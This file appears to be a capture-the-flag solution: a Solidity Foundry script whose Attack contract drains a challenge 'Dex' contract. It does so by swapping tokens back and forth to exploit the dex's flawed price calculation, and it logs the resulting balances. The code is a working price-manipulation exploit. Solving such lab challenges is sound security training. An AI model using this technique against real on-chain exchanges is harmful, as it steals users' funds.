// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

import {Script, console} from "forge-std/Script.sol";
import {Dex, SwappableToken, IERC20} from "src/Dex.sol";

contract Attack {
    Dex dex;
    address private owner;
    address public tkn1;
    address public tkn2;

    uint8 count;

    constructor(address _owner, Dex _dex) {
        owner = _owner;
        dex = _dex;
        tkn1 = dex.token1();
        tkn2 = dex.token2();
    }

    function ApprovalAndSendTokens() external {
        require(msg.sender == owner);
        IERC20(dex.token1()).transferFrom(msg.sender, address(this), 10);
        IERC20(dex.token2()).transferFrom(msg.sender, address(this), 10);

        dex.approve(address(dex), type(uint256).max);
    }

    function loop() external {
        for (count = 0; count < 10; count++) {
            if (count % 2 == 0) {
                priceManipulation(tkn1, tkn2);
            } else {
                priceManipulation(tkn2, tkn1);
            }
        }
    }

    function priceManipulation(address _from, address _to) internal {
        uint256 myBalance = dex.balanceOf(_from, address(this));
        uint256 dexBalance = dex.balanceOf(_from, address(dex));
        uint256 swapAmount = myBalance < dexBalance ? myBalance : dexBalance;

        if (swapAmount > 0) {
            dex.swap(_from, _to, swapAmount);
        }
    }
}

contract Solve is Script {
    Attack attack;
    Dex dex;

    address instanceAddr = 0xEba578e30d15AE2390d06E88F4eafc465Ff46f22;

    function run() external {
        dex = Dex(instanceAddr);

        vm.startBroadcast();
        attack = new Attack(msg.sender, dex);
        IERC20(dex.token1()).approve(address(attack), type(uint256).max);
        IERC20(dex.token2()).approve(address(attack), type(uint256).max);
        attack.ApprovalAndSendTokens();
        attack.loop();
        vm.stopBroadcast();

        console.log("token 1 user balance:", dex.balanceOf(dex.token1(), address(attack)));
        console.log("token 2 user balance:", dex.balanceOf(dex.token2(), address(attack)));
        console.log("token 1 dex balance:", dex.balanceOf(dex.token1(), address(dex)));
        console.log("token 2 dex balance:", dex.balanceOf(dex.token2(), address(dex)));
    }
}
